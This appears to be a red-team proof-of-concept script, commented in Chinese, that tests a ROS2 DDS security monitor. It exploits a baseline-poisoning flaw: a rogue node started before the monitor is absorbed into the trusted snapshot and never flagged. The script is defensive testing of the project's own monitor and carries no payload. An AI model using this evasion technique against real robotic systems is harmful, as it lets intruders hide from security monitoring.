#!/usr/bin/env python3
"""攻擊 N5 — Pre-startup baseline poison.

N2 修補移除 _INTERNAL_NODE_REGEX 改用 grace period baseline snapshot：
    monitor 啟動後第一次 _check_graph poll 時，把當下整個 ROS2 graph
    存進 _known_nodes。後續 poll 用 (current - _known_nodes) 偵測新節點。

漏洞（[monitor_node.py:392-400](../src/dds_security_monitor/dds_security_monitor/monitor_node.py#L392-L400)）：

    if not self._initialized:
        self._known_nodes = current        # ← 不分白名單，全收
        self._initialized = True
        return

grace period 邏輯（同檔 405-418 行）只在 _initialized=True 之後生效，
而且只吸收 WHITELIST 上的新節點。但「首次快照」本身無條件吸收一切。

攻擊：攻擊者只要在 monitor 啟動前就在線，就會被當成 baseline 的一部分，
monitor 從頭到尾不會發現他。

對比舊 N2（regex 後門）：攻擊者用任何名字都能進，只要 timing 對。
"""
import sys
import time
import rclpy
from rclpy.node import Node


class PrePoisonAttacker(Node):
    """在 monitor 啟動前出現 → 進 baseline → 永久隱身"""

    def __init__(self, fake_name: str):
        super().__init__(fake_name)
        self._n = 0
        self.create_timer(2.0, self._tick)
        self.get_logger().error(
            f'☠️ pre-poison: 「{fake_name}」進入 graph'
            f'，等待 monitor 啟動 → 首次 poll 會把我吃進 baseline'
        )

    def _tick(self):
        self._n += 1
        self.get_logger().warn(
            f'  我還在（已存活 {self._n*2}s），名字「{self.get_name()}」'
            f' 不在白名單但 monitor 看不見'
        )


def main():
    fake_name = sys.argv[1] if len(sys.argv) > 1 else 'totally_evil_node'
    duration = float(sys.argv[2]) if len(sys.argv) > 2 else 30.0
    rclpy.init()
    node = PrePoisonAttacker(fake_name)
    deadline = time.monotonic() + duration
    try:
        while rclpy.ok() and time.monotonic() < deadline:
            rclpy.spin_once(node, timeout_sec=0.5)
    finally:
        node.get_logger().error('⏹ 結束（隱身退場）')
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
